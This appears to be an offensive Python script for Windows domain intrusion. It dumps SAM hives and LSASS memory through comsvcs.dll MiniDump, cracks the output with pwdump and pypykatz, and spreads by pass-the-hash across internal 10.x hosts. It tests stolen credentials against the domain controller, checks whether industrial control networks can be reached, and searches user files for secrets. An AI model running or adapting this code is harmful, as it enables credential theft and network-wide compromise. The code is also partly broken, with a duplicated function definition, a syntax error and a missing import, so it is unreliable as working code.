from msrpcproxy import *
from netaddr import IPRange

DC = "10.0.0.1"
targets = open("targets.txt").read().split()

def hashdump(host):
	host(r"reg save hklm\sam c:\windows\temp\sam")
	host.get("/windows/temp/sam", "/tmp/sam")
	host(r"reg save hklm\system c:\windows\temp\system")
	host.get("/windows/temp/system", "/tmp/system")
	return subprocess.run("~/src/creddump7/pwdump.py /tmp/system /tmp/sam", shell=True, stdout=subprocess.PIPE).stdout

def mimikatz(host):
	pid = host("tasklist | findstr lsass.exe").split()[1]
	host(rf"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump {pid} C:\windows\temp\lsass.dmp full")
	host.get("/windows/temp/lsass.dmp", "/tmp/lsass.dmp")
	return subprocess.run("pypykatz lsa minidump /tmp/lsass.dmp", shell=True, stdout=subprocess.PIPE).stdout

def lateral(host):
	global targets
	del(targets[targets.index(host.ip)])
	if "172.16." in host("netstat -an"):
		print("[+] ICS reached")
	for user,password in mimikatz(host):
		try:
			host.msrpc(DC, user, password, "corp"):
			print("[+] domain admin found")
		except:
			pass
	for user,lm,nt in hashdump(host):
		for ip in targets[:]:
			try:
				lateral(msrpc(ip, user, nthash=nt))
			except:
				lateral(host.msrpc(ip, user, nthash=nt))

owned_hosts = []
def lateral(host):
	global owned_hosts
	local = hashdump(host)
	print(host(r"findstr s3cr3t c:\users\*.txt"))
	for ip,_,_ in host("arp -a").split("\r\n"):
		if ip in IPRange("10.0.0.0/8") and not ip in owned_hosts:
			for user,lm,nt in local:
				owned_hosts.append(ip)
				lateral(msrpc(ip, user, nthash=nt))
	for ip,_,_ in host("netstat -an").split("\r\n"):
		if ip in IPRange("10.0.0.0/8") and not ip in owned_hosts:
			for user,lm,nt in local:
				owned_hosts.append(ip)
				try:
					lateral(msrpc(ip, user, nthash=nt))
				except:
					lateral(host.msrpc(ip, user, nthash=nt))

lateral(msrpc("10.10.54.77", "admin", "p@ssw0rd"))
